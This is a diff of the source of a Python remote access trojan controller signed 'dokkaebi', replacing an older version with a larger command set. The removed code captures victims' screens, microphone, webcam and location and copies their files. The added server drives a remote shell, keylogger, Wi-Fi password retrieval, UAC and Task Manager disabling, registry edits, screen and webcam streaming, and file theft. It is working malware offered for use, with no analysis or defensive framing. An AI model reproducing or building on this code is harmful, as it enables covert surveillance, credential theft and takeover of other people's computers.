@@ -1,282 +1,494 @@
-import os
-import subprocess
-import shutil
-import pyscreenshot
-import pyaudio
-import wave
-import cv2
-import geocoder
 import socket
+import os
 import time
-import threading
-import signal
-
-# Global variables
-HOST = 'Changeme'
-PORT = Changeme
-
-# Color codes
-COLOR_GREEN = '\033[92m'
-COLOR_RED = '\033[91m'
-COLOR_CYAN = '\033[96m'
-COLOR_YELLOW = '\033[93m'
-
-# ASCII cat
-CAT_ASCII = """
-⠀ ／l、
-（ﾟ､ ｡ ７
-⠀ l、ﾞ ~ヽ
-  じしf_, )ノ
-"""
-
-def colored_print(msg, color):
-    """Print colored message."""
-    print(color + msg + '\033[0m')
-
-def show_loading_screen():
-    """Display loading screen with ASCII art."""
-    print(COLOR_YELLOW + CAT_ASCII)
-    print(COLOR_CYAN + "Press Ctrl + C to stop the script.")
-
-def take_screenshot():
-    """Capture and save a screenshot."""
-    try:
-        screenshot = pyscreenshot.grab()
-        screenshot.save('screenshot.jpg')
-        colored_print("Screenshot captured successfully.", COLOR_GREEN)
-    except Exception as e:
-        colored_print(f"Failed to capture screenshot: {e}", COLOR_RED)
-
-def record_audio():
-    """Record audio from the microphone."""
-    try:
-        CHUNK = 1024
-        FORMAT = pyaudio.paInt16
-        CHANNELS = 2
-        RATE = 44100
-        RECORD_SECONDS = 10
-        WAVE_OUTPUT_FILENAME = "output.wav"
-
-        audio = pyaudio.PyAudio()
-
-        stream = audio.open(format=FORMAT, channels=CHANNELS,
-                            rate=RATE, input=True,
-                            frames_per_buffer=CHUNK)
-
-        frames = []
-
-        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
-            data = stream.read(CHUNK)
-            frames.append(data)
-
-        stream.stop_stream()
-        stream.close()
-        audio.terminate()
-
-        waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
-        waveFile.setnchannels(CHANNELS)
-        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
-        waveFile.setframerate(RATE)
-        waveFile.writeframes(b''.join(frames))
-        waveFile.close()
-        colored_print("Audio recorded successfully.", COLOR_GREEN)
-    except Exception as e:
-        colored_print(f"Failed to record audio: {e}", COLOR_RED)
-
-def capture_camera():
-    """Capture an image from the camera."""
-    try:
-        camera = cv2.VideoCapture(0)
-        ret, frame = camera.read()
-        cv2.imwrite("camera_capture.jpg", frame)
-        camera.release()
-        colored_print("Camera capture successful.", COLOR_GREEN)
-    except Exception as e:
-        colored_print(f"Failed to capture camera: {e}", COLOR_RED)
-
-def get_gps_location():
-    """Get GPS location based on IP address."""
-    try:
-        g = geocoder.ip('me')
-        if g.ok:
-            latitude, longitude = g.latlng
-            output = f"{latitude}, {longitude}"
-            with open("gps_location.txt", "w") as f:
-                f.write(output)
-            colored_print(output, COLOR_CYAN)
-        else:
-            colored_print("Failed to get GPS location.", COLOR_RED)
-    except Exception as e:
-        colored_print(f"Failed to get GPS location: {e}", COLOR_RED)
-
-def execute_command():
-    """Execute shell command."""
-    try:
-        while True:
-            command = input("Command: ")
-            if command.lower() == 'exit':
-                break
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            colored_print(result.stdout, COLOR_GREEN)
-            colored_print(result.stderr, COLOR_RED)
-    except Exception as e:
-        colored_print(f"Error executing command: {e}", COLOR_RED)
-
-def transfer_files():
-    """Transfer files."""
-    try:
-        # Example: Transfer all .txt files from victim to attacker
-        files = os.listdir('.')
-        for file in files:
-            if file.endswith('.txt'):
-                shutil.copy(file, '/path/to/attacker')
-        colored_print("Files transferred successfully.", COLOR_GREEN)
-    except Exception as e:
-        colored_print(f"Failed to transfer files: {e}", COLOR_RED)
-
-def upload_script(file_path):
-    """Upload a script to victim's machine."""
-    try:
-        # Example: Upload a script specified by the attacker to victim's machine
-        shutil.copy(file_path, '/path/to/victim')
-        colored_print("Script uploaded successfully.", COLOR_GREEN)
-    except Exception as e:
-        colored_print(f"Failed to upload script: {e}", COLOR_RED)
-
-def execute_uploaded_script(script_path):
-    """Execute the uploaded script on victim's machine."""
-    try:
-        # Example: Execute the uploaded script specified by the attacker on victim's machine
-        subprocess.run(['python', script_path])
-        colored_print("Script executed successfully.", COLOR_GREEN)
-    except Exception as e:
-        colored_print(f"Failed to execute script: {e}", COLOR_RED)
-
-def initiate_shutdown(countdown_time):
-    """Initiate system shutdown with a custom countdown."""
-    try:
-        # Create a .bat file to initiate shutdown with a custom countdown message and time
-        with open("shutdown.bat", "w") as f:
-            f.write(f'@echo off\n')
-            f.write(f'echo Your PC has been hacked By Dokkaebi. Goodnight.\n')
-            f.write(f'echo Countdown {countdown_time}\n')
-            f.write(f'shutdown /s /t {countdown_time}\n')
-        colored_print("Shutdown script created successfully.", COLOR_GREEN)
-    except Exception as e:
-        colored_print(f"Failed to create shutdown script: {e}", COLOR_RED)
-
-def send_menu_options():
-    """Display menu options for the attacker."""
-    menu_options = (
-        "Menu Options:\n"
-        "1. Take screenshot\n"
-        "   - Capture and save a screenshot.\n"
-        "2. Save passwords\n"
-        "   - Not implemented yet.\n"
-        "3. Record audio\n"
-        "   - Record audio from the microphone.\n"
-        "4. Capture camera\n"
-        "   - Capture an image from the camera.\n"
-        "5. Get GPS location\n"
-        "   - Get GPS location based on IP address.\n"
-        "6. Execute command\n"
-        "   - Execute shell command.\n"
-        "7. Transfer files\n"
-        "   - Transfer files from victim to attacker.\n"
-        "8. Upload script\n"
-        "   - Upload a script to victim's machine.\n"
-        "9. Execute uploaded script\n"
-        "   - Execute the uploaded script on victim's machine.\n"
-        "10. Initiate shutdown [time]\n"
-        "   - Initiate system shutdown with a custom countdown.\n"
-    )
-    print(menu_options)
+import random
 
 class RAT_SERVER:
     def __init__(self, host, port):
         self.host = host
         self.port = port
-        self.server = None
-        self.client = None
-
+    
     def build_connection(self):
+        global client, addr, s
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((self.host, self.port))
+        s.listen(5)
+        print("\033[31m")  # Red color escape sequence
+        print("⠀ ／l、")
+        print("（ﾟ､ ｡ ７")
+        print("⠀l、ﾞ ~ヽ")
+        print("  じしf_, )ノ):")
+        print("\033[0m")  # Reset color escape sequence
+        print("[*] Waiting for the client...")
+        while True:
+            try:
+                client, addr = s.accept()
+                break
+            except:
+                print("\033[H\033[J")
+                print("[*] Waiting for the client " + self.loading_animation())
+                time.sleep(0.1)
+        print()
+        ipcli = client.recv(1024).decode()
+        print(f"[*] Connection is established successfully with {ipcli}")
+        print()
+    
+    def loading_animation(self):
+        animation = "|/-\\"
+        for i in range(20):
+            time.sleep(0.1)
+            print("\033[F", end="")
+            print("\033[K", end="")
+            print("[" + animation[i % len(animation)] + "]", end="")
+        return ""
+    
+    def server(self):
         try:
-            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.server.bind((self.host, self.port))
-            self.server.listen(5)
-            show_loading_screen()  # Display loading screen before waiting for the client
-            print("[*] Waiting for the client...")
-            self.client, addr = self.server.accept()
-            ipcli = self.client.recv(1024).decode()
-            print(f"[*] Connection is established successfully with {ipcli}\n")
-            print("Sending menu options to the attacker...")
-            send_menu_options()  # Display menu options for the attacker after connection is established
-        except Exception as e:
-            print(f"Error building connection: {e}")
-
-    def execute_command(self, command):
-        try:
-            self.client.send(command.encode())
-            result_output = self.client.recv(1024).decode()
-            print(result_output)
-        except Exception as e:
-            print(f"Error executing command: {e}")
-
-    def send_file(self, file_path):
-        try:
-            with open(file_path, 'rb') as f:
-                file_data = f.read()
-                self.client.send(file_data)
-        except Exception as e:
-            print(f"Error sending file: {e}")
-
-    def receive_file(self, save_path):
-        try:
-            file_data = self.client.recv(2147483647)
-            with open(save_path, 'wb') as f:
-                f.write(file_data)
-        except Exception as e:
-            print(f"Error receiving file: {e}")
-
+            from vidstream import StreamingServer
+            global server
+            server = StreamingServer(self.host, 8080)
+            server.start_server()
+        except:
+            print("Module not found...")
+    
+    def stop_server(self):
+        server.stop_server()
+    
+    def result(self):
+        client.send(command.encode())
+        result_output = client.recv(1024).decode()
+        print(result_output)
+    
+    def banner(self):
+        print("======================================================")
+        print("                       Commands                       ")
+        print("======================================================")
+        print("System: ")
+        print("======================================================")
+        print(f'''
+help                      all commands available
+writein <text>            write the text to current opened window
+browser                   enter quiery to browser
+turnoffmon                turn off the monitor
+turnonmon                 turn on the monitor
+reboot                    reboot the system
+drivers                   all drivers of PC
+kill                      kill the system task
+sendmessage               send messagebox with the text
+cpu_cores                 number of CPU cores
+systeminfo (extended)     all basic info about system (via cmd)
+tasklist                  all system tasks
+localtime                 current system time
+curpid                    PID of client's process
+sysinfo (shrinked)        basic info about system (Powers of Python)
+shutdown                  shutdown client's PC
+isuseradmin               check if user is admin
+extendrights              extend system rights
+disabletaskmgr            disable Task Manager
+enabletaskmgr             enable Task Manager
+disableUAC                disable UAC
+monitors                  get all used monitors
+geolocate                 get location of computer
+volumeup                  increase system volume to 100%
+volumedown                decrease system volume to 0%
+setvalue                  set value in registry
+delkey                    delete key in registry
+createkey                 create key in registry
+setwallpaper              set wallpaper
+exit                      terminate the session of RAT
+''')
+        print("======================================================")
+        print("Shell: ")
+        print("======================================================")
+        print(f'''
+pwd                       get current working directory
+shell                     execute commands via cmd
+cd                        change directory
+[Driver]:                 change current driver
+cd ..                     change directory back
+dir                       get all files of current directory
+abspath                   get absolute path of files
+''')
+        print("======================================================")
+        print("Network: ")
+        print("======================================================")
+        print(f'''
+ipconfig                  local ip
+portscan                  port scanner
+profiles                  network profiles
+profilepswd               password for profile
+''')
+        print("======================================================")
+        print("Input devices: ")
+        print("======================================================")
+        print(f'''
+keyscan_start             start keylogger
+send_logs                 send captured keystrokes
+stop_keylogger            stop keylogger
+disable(--keyboard/--mouse/--all) 
+enable(--keyboard/--mouse/--all)
+''')
+        print("======================================================")
+        print("Video: ")
+        print("======================================================")
+        print(f'''
+screenshare               overseing remote PC
+webcam                    webcam video capture
+breakstream               break webcam/screenshare stream
+screenshot                capture screenshot
+webcam_snap               capture webcam photo
+''')
+        print("======================================================")
+        print("Files:")
+        print("======================================================")
+        print(f'''
+delfile <file>            delete file
+editfile <file> <text>    edit file
+createfile <file>         create file
+download <file> <homedir> download file
+upload                    upload file
+cp <file1> <file2>        copy file
+mv <file> <path>          move file
+searchfile <file> <dir>   search for file in mentioned directory
+mkdir <dirname>           make directory
+rmdir <dirname>           remove directory
+startfile <file>          start file
+readfile <file>           read from file
+        ''')
+        print("======================================================")
+    
     def execute(self):
-        try:
-            while True:
-                rat_command = input("Command >> ")
-                if rat_command == '1':
-                    take_screenshot()
-                elif rat_command == '2':
-                    # Save passwords (implement this function)
-                    pass
-                elif rat_command == '3':
-                    record_audio()
-                elif rat_command == '4':
-                    capture_camera()
-                elif rat_command == '5':
-                    get_gps_location()
-                elif rat_command == '6':
-                    execute_command()
-                elif rat_command == '7':
-                    transfer_files()
-                elif rat_command == '8':
-                    file_path = input("Enter the path of the script to upload: ")
-                    upload_script(file_path)
-                elif rat_command == '9':
-                    script_path = input("Enter the name of the script to execute: ")
-                    execute_uploaded_script(script_path)
-                elif rat_command.startswith('10 '):
-                    # Extract countdown time from the command
-                    countdown_time = rat_command.split(' ')[1]
-                    initiate_shutdown(countdown_time)
-                else:
-                    print("Invalid command. Please enter a number from the menu options.")
-        except KeyboardInterrupt:
-            print("\nExiting...")
-            if self.client:
-                self.client.close()
-            if self.server:
-                self.server.close()
+        self.banner()
+        while True:
+            global command
+            command = input('Command >>  ')
 
-if __name__ == "__main__":
-    rat = RAT_SERVER(HOST, PORT)
+            if command == 'shell':
+                client.send(command.encode())
+                while 1:
+                    command = str(input('>> '))
+                    client.send(command.encode())
+                    if command.lower() == 'exit':
+                        break
+                    result_output = client.recv(1024).decode()
+                    print(result_output)
+                client.close()
+                s.close()
+            
+            elif command == 'drivers':
+                self.result()
+            
+            elif command == 'setvalue':
+                client.send(command.encode())
+                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
+                key = str(input('Enter the key name: '))
+                value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
+                client.send(const.encode())
+                client.send(root.encode())
+                client.send(key.encode())
+                client.send(value.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command == 'delkey':
+                client.send(command.encode())
+                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                root = str(input('Enter the path to key: '))
+                client.send(const.encode())
+                client.send(root.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command == 'createkey':
+                client.send(command.encode())
+                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                root = str(input('Enter the path to key: '))
+                client.send(const.encode())
+                client.send(root.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command == 'disableUAC':
+                self.result()
+            
+            elif command == 'reboot':
+                self.result()
+            
+            elif command == 'usbdrivers':
+                self.result()
+            
+            elif command == 'volumeup':
+                self.result()
+            
+            elif command == 'volumedown':
+                self.result()
+            
+            elif command == 'monitors':
+                self.result()
+            
+            elif command[:4] == 'kill':
+                if not command[5:]:
+                    print("No process mentioned to terminate")
+                else:
+                    self.result()
+            
+            elif command == 'extendrights':
+                self.result()
+            
+            elif command == 'geolocate':
+                self.result()
+            
+            elif command == 'turnoffmon':
+                self.result()
+            
+            elif command == 'turnonmon':
+                self.result()
+            
+            elif command == 'setwallpaper':
+                client.send(command.encode())
+                text = str(input("Enter the filename: "))
+                client.send(text.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command == 'keyscan_start':
+                client.send(command.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command == 'send_logs':
+                client.send(command.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command == 'stop_keylogger':
+                client.send(command.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command[:7] == 'delfile':
+                if not command[8:]:
+                    print("No file to delete")
+                else:
+                    self.result()
+            
+            elif command[:10] == 'createfile':
+                if not command[11:]:
+                    print("No file to create")
+                else:
+                    self.result()
+            
+            elif command == 'tasklist':
+                self.result()
+            
+            elif command == 'ipconfig':
+                self.result()
+            
+            elif command[:7] == 'writein':
+                if not command[8:]:
+                    print("No text to output")
+                else:
+                    self.result()
+            
+            elif command == 'sendmessage':
+                client.send(command.encode())
+                text = str(input("Enter the text: "))
+                client.send(text.encode())
+                title = str(input("Enter the title: "))
+                client.send(title.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command == 'profilepswd':
+                client.send(command.encode())
+                profile = str(input("Enter the profile name: "))
+                client.send(profile.encode())
+                result_output = client.recv(2147483647).decode()
+                print(result_output)
+            
+            elif command == 'profiles':
+                self.result()
+
+            elif command == 'cpu_cores':
+                self.result()
+            
+            elif command[:2] == 'cd':
+                if not command[3:]: 
+                    print("No directory")
+                else:
+                    self.result()
+            
+            elif command == 'cd ..':
+                self.result()
+            
+            elif command[1:2] == ':':
+                self.result()
+            
+            elif command == 'dir':
+                self.result()
+            
+            elif command == 'portscan':
+                self.result()
+            
+            elif command == 'systeminfo':
+                self.result()
+            
+            elif command == 'localtime':
+                self.result()
+            
+            elif command[:7] == 'abspath':
+                if not command[8:]:
+                    print("No file")
+                else:
+                    self.result()
+            
+            elif command[:8] == 'readfile':
+                if not command[9:]:
+                    print("No file to read")
+                else:
+                    client.send(command.encode())
+                    result_output = client.recv(2147483647).decode()
+                    print("===================================================")
+                    print(result_output)
+                    print("===================================================")
+            
+            elif command.startswith("disable") and command.endswith("--keyboard"):
+                self.result()
+            
+            elif command.startswith("disable") and command.endswith("--mouse"):
+                self.result()
+            
+            elif command.startswith("disable") and command.endswith("--all"):
+                self.result()
+            
+            elif command.startswith("enable") and command.endswith("--all"):
+                self.result()
+            
+            elif command.startswith("enable") and command.endswith("--keyboard"):
+                self.result()
+            
+            elif command.startswith("enable") and command.endswith("--mouse"):
+                self.result()
+            
+            elif command[:7] == 'browser':
+                client.send(command.encode())
+                quiery = str(input("Enter the quiery: "))
+                client.send(quiery.encode())
+                result_output = client.recv(1024).decode()
+                print(result_output)
+            
+            elif command[:2] == 'cp':
+                self.result()
+            
+            elif command[:2] == 'mv':
+                self.result()
+            
+            elif command[:8] == 'editfile':
+                self.result()
+            
+            elif command[:5] == 'mkdir':
+                if not command[6:]:
+                    print("No directory name")
+                else:
+                    self.result()
+            
+            elif command[:5] == 'rmdir':
+                if not command[6:]:
+                    print("No directory name")
+                else:
+                    self.result()
+            
+            elif command[:10] == 'searchfile':
+                self.result()
+            
+            elif command == 'curpid':
+                self.result()
+            
+            elif command == 'sysinfo':
+                self.result()
+            
+            elif command == 'pwd':
+                self.result()
+            
+            elif command == 'screenshare':
+                client.send(command.encode("utf-8"))
+                self.server()
+            
+            elif command == 'webcam':
+                client.send(command.encode("utf-8"))
+                self.server()
+            
+            elif command == 'breakstream':
+                self.stop_server()
+            
+            elif command[:9] == 'startfile':
+                if not command[10:]:
+                    print("No file to launch")
+                else:
+                    self.result()
+
+            elif command[:8] == 'download':
+                try:
+                    client.send(command.encode())
+                    file = client.recv(2147483647)
+                    with open(f'{command.split(" ")[2]}', 'wb') as f:
+                        f.write(file)
+                        f.close()
+                    print("File is downloaded")
+                except: 
+                    print("Not enough arguments")
+
+            elif command == 'upload':
+                client.send(command.encode())
+                file = str(input("Enter the filepath to the file: "))
+                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
+                data = open(file, 'rb')
+                filedata = data.read(2147483647)
+                client.send(filename.encode())
+                print("File has been sent")
+                client.send(filedata)
+            
+            elif command == 'disabletaskmgr':
+                self.result()
+            
+            elif command == 'enabletaskmgr':
+                self.result()
+            
+            elif command == 'isuseradmin':
+                self.result()
+            
+            elif command == 'help':
+                self.banner()
+            
+            elif command == 'screenshot':
+                client.send(command.encode())
+                file = client.recv(2147483647)
+                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
+                with open(path, 'wb') as f:
+                    f.write(file)
+                    f.close()
+                path1 = os.path.abspath(path)
+                print(f"File is stored at {path1}")
+            
+            elif command == 'webcam_snap':
+                client.send(command.encode())
+                file = client.recv(2147483647)
+                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
+                    f.write(file)
+                    f.close()
+                print("File is downloaded")
+
+            elif command == 'exit':
+                client.send(command.encode())
+                output = client.recv(1024)
+                output = output.decode()
+                print(output)
+                s.close()
+                client.close()
+
+if __name__ == '__main__':
+    print("Made by dokkaebi")
+    rat = RAT_SERVER('changeme', changeme)
     rat.build_connection()
     rat.execute()
